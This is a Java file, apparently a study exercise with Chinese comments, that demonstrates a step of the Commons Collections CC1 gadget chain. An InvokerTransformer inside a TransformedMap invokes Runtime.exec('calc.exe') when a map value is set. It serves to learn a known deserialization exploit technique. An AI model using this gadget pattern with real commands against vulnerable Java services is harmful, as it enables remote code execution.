package demo.cc.cc1;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class Test01 {
    public static void main(String[] args) throws Exception {
        ApacheCC1 apacheCC1 = new ApacheCC1();
        apacheCC1.test2();

    }
    //在TransformeMap中进行调用checkSetValue方法
    public void test2() throws Exception{
        Runtime runtime = Runtime.getRuntime();
        String methodName = "exec";
        Class[] paramTypes = new Class[] {String.class};
        Object[] args = new Object[]{"calc.exe"};
        InvokerTransformer invokerTransformer = new  InvokerTransformer(methodName,paramTypes,args);


        Map map = new HashMap<>();
        map.put("key","vlaue");
        Transformer keyTransformer = null;
        Transformer valueTransformer = invokerTransformer;
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,keyTransformer,valueTransformer);
        //transformedMap 是由Map声明，所以不能直接调用checkSetValue，所以只能往上级找

        for(Map.Entry entry:transformedMap.entrySet()){
            entry.setValue(runtime);
        }
    }
}


